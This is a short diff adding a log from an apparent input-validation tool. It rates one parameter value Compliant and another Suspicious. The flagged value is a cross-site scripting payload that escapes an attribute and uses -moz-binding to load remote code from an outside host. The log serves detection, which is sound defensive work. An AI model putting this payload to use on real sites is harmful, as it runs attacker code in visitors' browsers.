@@ -1,0 +1,5 @@
+2016-06-24T06:29:52.627-06:00
+name : lA .1.8X.''.3  56y.. oH..C
+desc : style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+The parameter: name :  having value: lA .1.8X.''.3  56y.. oH..C is: Compliant
+The parameter: desc :  having value: style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a=" is: Suspicious
